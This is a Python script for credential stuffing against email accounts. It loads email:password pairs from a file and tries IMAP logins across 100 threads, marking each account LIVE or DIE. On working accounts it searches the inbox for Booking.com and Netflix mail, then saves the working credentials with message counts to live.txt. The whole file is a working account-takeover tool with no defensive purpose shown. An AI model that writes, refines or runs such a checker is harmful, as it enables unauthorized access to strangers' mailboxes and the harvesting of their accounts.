import imaplib
import os
import threading
from queue import Queue

def read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        lines = [line.strip() for line in file if line.strip()]
    credentials = []
    for line in lines:
        parts = line.split(':', 1)  # Split only at the first ':'
        if len(parts) == 2:
            email, password = parts
            credentials.append({'email': email.strip(), 'password': password.strip()})
        else:
            print(f"[!] Invalid format in line: {line}")
    return credentials

def login(email, password):
    domain = email.split('@')[1]
    imap_server = f'imap.{domain}'

    print(f"IMAP Server: {imap_server}")

    try:
        mail = imaplib.IMAP4_SSL(imap_server)
        mail.login(email, password)
        print(f"[+] LIVE {email}\n")

        total_messages = {}

        # Membuka inbox dan mencari pesan dari booking.com dan netflix.com
        status, mailboxes = mail.list()
        if status == 'OK':
            mail.select('INBOX')
            for sender in ["booking.com", "netflix.com"]:
                status, data = mail.search(None, f'(FROM "{sender}")')
                if status == 'OK':
                    messages = data[0].split()
                    total_messages[sender] = len(messages)
                    print(f"Ditemukan {len(messages)} pesan dari {sender} untuk {email}.")
                    for num in messages:
                        status, msg_data = mail.fetch(num, '(RFC822)')
                        if status == 'OK':
                            print(f"Pesan {num.decode()} berhasil diambil untuk {email} dari {sender}.")

        with open('live.txt', 'a', encoding='utf-8') as live_file:
            message_summary = ', '.join([f"{sender}: {count}" for sender, count in total_messages.items()])
            live_file.write(f"{email}:{password} | {message_summary}\n")

        return mail

    except imaplib.IMAP4.error as err:
        print(f"[-] DIE {email}: {err}\n")
        return None

    except Exception as e:
        print(f"[!] ERROR {email}: {e}")
        return None

def worker(queue):
    while not queue.empty():
        cred = queue.get()
        process_account(cred)
        queue.task_done()

def process_account(cred):
    email = cred['email']
    password = cred['password']
    mail = login(email, password)
    if mail:
        mail.logout()

def main():
    credentials = read_credentials('data.txt')
    queue = Queue()

    for cred in credentials:
        queue.put(cred)

    threads = []
    for _ in range(100):  # Use 30 threads
        thread = threading.Thread(target=worker, args=(queue,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()